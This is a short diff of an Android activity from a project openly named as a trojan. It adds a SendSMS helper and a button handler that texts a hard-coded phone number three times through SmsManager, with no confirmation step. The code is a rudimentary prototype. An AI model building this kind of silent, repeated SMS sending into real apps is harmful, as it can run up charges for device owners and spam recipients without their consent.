@@ -2,6 +2,7 @@ package trojan.android.android_trojan;
 
 import android.app.Activity;
 import android.content.Context;
+import android.content.Intent;
 import android.os.Bundle;
 import android.provider.Telephony;
 import android.telephony.SmsManager;
@@ -26,22 +27,28 @@ public class first_activity extends Activity {
         button01 = (Button) findViewById(R.id.button01);
 
         button01.setOnClickListener(new View.OnClickListener() {
+
             @Override
+
+
             public void onClick(View v) {
-                SmsManager();
-            }
+                for(int i = 1; i <= 3; i++) {
+                SendSMS("0628470850", "Test Message 2.1");
+            }}
         });
 
 
     }
 
 
-    public void SmsManager() {
+
+        public void SendSMS (String numTelephone, String message){
         // permet de voir dans les log si la fct marche
-        Log.d(TAG, "SmsManager");
-        SmsManager manager = SmsManager.getDefault();
-        manager.sendTextMessage("0628470850", null, "Test Message 1 !", null, null);
+        Log.d(TAG, "SendSMS");
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage(numTelephone, null, message, null, null);
     }
+
 }
 
 
